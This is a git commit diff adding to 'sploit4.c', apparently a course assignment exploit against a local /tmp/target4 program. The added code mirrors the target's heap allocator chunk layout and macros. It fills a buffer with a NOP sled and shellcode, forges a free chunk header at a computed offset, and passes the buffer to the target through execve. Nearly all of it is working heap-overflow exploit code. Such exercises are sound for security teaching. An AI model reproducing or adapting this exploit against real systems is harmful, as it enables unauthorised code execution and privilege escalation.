5d83b141373677bf05ab1995dd3d9f09eadf8a19
Peter C <peter@drifty.com>
2014-02-12 20:03:21 -0800

    sploit 4 WIP

--- sploits/sploit4.c
+++ sploits/sploit4.c
@@ -6,12 +6,64 @@
 
 #define TARGET "/tmp/target4"
 
+/*
+ * the chunk header
+ */
+typedef double ALIGN;
+
+typedef union CHUNK_TAG
+{
+  struct
+    {
+      union CHUNK_TAG *l;       /* leftward chunk */
+      union CHUNK_TAG *r;       /* rightward chunk + free bit (see below) */
+    } s;
+  ALIGN x;
+} CHUNK;
+
+/*
+ * we store the freebit -- 1 if the chunk is free, 0 if it is busy --
+ * in the low-order bit of the chunk's r pointer.
+ */
+
+/* *& indirection because a cast isn't an lvalue and gcc 4 complains */
+#define SET_FREEBIT(chunk) ( *(unsigned *)&(chunk)->s.r |=  0x1 )
+#define CLR_FREEBIT(chunk) ( *(unsigned *)&(chunk)->s.r &= ~0x1 )
+#define GET_FREEBIT(chunk) ( (unsigned)(chunk)->s.r & 0x1 )
+
+/* it's only safe to operate on chunk->s.r if we know freebit
+ * is unset; otherwise, we use ... */
+#define RIGHT(chunk) ((CHUNK *)(~0x1 & (unsigned)(chunk)->s.r))
+
+/*
+ * chunk size is implicit from l-r
+ */
+#define CHUNKSIZE(chunk) ((unsigned)RIGHT((chunk)) - (unsigned)(chunk))
+
+/*
+ * back or forward chunk header
+ */
+#define TOCHUNK(vp) (-1 + (CHUNK *)(vp))
+#define FROMCHUNK(chunk) ((void *)(1 + (chunk)))
+
 int main(void)
 {
   char *args[3];
   char *env[1];
+  char buf[1024];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  memset(buf, 0x90, 1024);
+  strncpy(buf+972, shellcode, 45);
+  //strncpy(buf+244, "\x12\x34\x56\x78", 4);
+
+  void* vp = (void*)buf + (0x8059948 - 0x8059878);
+  CHUNK *p = TOCHUNK(vp);
+
+  SET_FREEBIT(p);
+ 
+  args[0] = TARGET; 
+  args[1] = buf;
+  args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
